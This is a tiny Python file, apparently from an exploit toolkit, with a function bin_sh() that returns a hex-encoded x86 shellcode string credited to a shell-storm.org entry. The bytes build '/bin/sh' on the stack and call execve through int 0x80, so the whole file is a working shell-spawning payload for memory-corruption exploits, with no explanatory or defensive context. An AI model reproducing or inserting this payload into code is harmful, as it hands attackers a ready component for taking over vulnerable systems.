#http://shell-storm.org/shellcode/files/shellcode-170.php
#by IZ <guerrilla.sytes.net>

def bin_sh():
	shellcode =  r"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
	shellcode += r"\x68\x2f\x62\x69\x6e\x89\xe3"
	shellcode += r"\x50\x54\x53\x50\xb0\x3b\xcd\x80"
	return shellcode
